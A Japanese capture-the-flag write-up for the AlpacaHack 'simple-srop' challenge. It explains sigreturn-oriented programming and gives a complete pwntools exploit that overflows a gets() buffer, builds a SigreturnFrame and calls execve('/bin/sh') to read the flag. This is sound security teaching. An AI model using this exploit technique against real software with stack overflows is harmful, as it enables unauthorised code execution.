# simple ROP?

https://alpacahack.com/daily-bside/challenges/simple-srop

## 問題の概要

`win` 関数のアドレスがリークされ、`gets(buffer)` でローカル変数 `char buffer[64]` に入力を読み込まれます。

```c
int main(void) {
    char buffer[64];
    printf("address of win function: %p\n", win);
    printf("input > ");
    gets(buffer);
    return 0;
}
```

shell に execve する `win` 関数が用意されており、Stack Canary がなく ROP が可能ですが、`win` に指定された引数を渡して呼び出す必要があります。

```c
void win(unsigned long long param1) {
    char command[] = "/bin/sh";

    if (param1 == 0xdeadbeefcafebabeULL) {
        puts("Check passed: param1 == 0xdeadbeefcafebabe");
    } else {
        printf("Check failed: param1 != 0xdeadbeefcafebabe (actual: %llx)\n", param1);
        exit(1);
    }

    printf("All checks passed! Spawning shell...\n");
    execve(command, NULL, NULL);
}
```

`win` 関数の手前に ROP 用の gadget が用意されています。

```c
// ROP gadgets
__asm__(
    "pop %rax\nret\n"
    "syscall\nret\n"
);
```

フラグは `/flag-{hash}.txt` に配置されています。

### バイナリ情報

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
FORTIFY:    Enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

## 解法を考える

ぱっと思いつくのは

1. `$rdi` に `0xdeadbeefcafebabe` をセットして `win` の先頭にジャンプする
2. `$rdi` に `"/bin/sh"` を指すアドレスをセットして `win` の `execve` の呼び出し部分 (`<win+67>`) にジャンプする
3. `$rax` に `execve` の syscall 番号、`$rdi` に `"/bin/sh"` を指すアドレスをセットして `syscall` gadget にジャンプする

などですが、いずれも `$rdi` に値をセットする必要があります。

問題の slug `simple-srop` の SROP について調べたところ、Signal Return Oriented Programming というテクニックがあることがわかりました。

参考: [SROP(Sigreturn Oriented Programming)についてまとめ by @kikyo_nanakusa - Qiita](https://qiita.com/kikyo_nanakusa/items/74a22c81960f04554670)

### SROP とは

Linux で `SIGINT` や `SIGSEGV` などのシグナルの処理は次のように行われます。

- シグナルが発生
- カーネルはプロセスの処理を中断し、その時点でのレジスタの状態などのコンテキストをプロセスのスタックに保存する
- ユーザー空間でシグナルハンドラを呼び出す
- シグナルハンドラの処理が終わったら `rt_sigreturn` システムコールを呼び出し、保存されたコンテキストを復元してプロセスの処理を再開する

SROP ではこの `rt_sigreturn` システムコールを利用します。

スタック上にコンテキストの構造体 `struct sigframe` を配置し、`rt_sigreturn` システムコールを呼び出すことができれば、`$rip` を含むレジスタに任意の値をセットすることができ、任意の位置からコードの実行を再開させることができます。

## 解法

`pwntools` の `SigreturnFrame` を使用すると、SROP のためのスタックフレームを構築できます。

`rt_sigreturn` でレジスタを復元すると `$rsp` も上書きされてしまいます。

"解法を考える" の 1. の方法ではスタックの読み書きが発生するため、`$rsp` 付近が読み書き可能なアドレスを指定する必要がありますが、今回はスタックのアドレスは不明です。

今回は 3. の方法で直接 `syscall` の gadget を呼び出すことで、`$rsp` の値を不問にして `execve` を呼び出すことにします。

`"/bin/sh"` のアドレスが必要ですが、`win` 関数の先頭でスタックに `"/bin/sh"` を push する命令列があり、この命令の一部のアドレスを利用できます。

```
pwndbg> x/s win+6
0x555555555286 <win+6>: "/bin/sh"
```

`main` 関数のリターンアドレスが `buffer` の何バイト目にあるかは、cyclic パターンを入力して確認したところ offset = 72 でした。

## 解答に使用したコード

```python
from pwn import remote, ELF, ROP, SigreturnFrame, flat, context

context.arch = "amd64"
offset = 72

def buildPayload(win_addr):
    elf = ELF("./handout/chal")
    elf.address = win_addr - elf.symbols["win"]
    rop = ROP(elf)
    rda_gadget = rop.find_gadget(["pop rax", "ret"])[0]
    syscall_gadget = rop.find_gadget(["syscall", "ret"])[0]

    sigframe = SigreturnFrame()
    sigframe.rip = syscall_gadget
    sigframe.rax = 59  # execve の syscall number
    sigframe.rdi = win_addr + 6  # "/bin/sh" のアドレス
    sigframe.rsi = 0  # NULL
    sigframe.rdx = 0  # NULL

    return flat(
        b"A" * offset,
        rda_gadget,
        15,  # rt_sigreturn の syscall number
        syscall_gadget,
        sigframe,
    )

conn = remote(host, port)
conn.recvuntil(b": ")
win_addr = int(conn.recvline().strip(), 16)
conn.sendline(buildPayload(win_addr))
conn.sendline(b"cat /flag*")
conn.interactive()
```
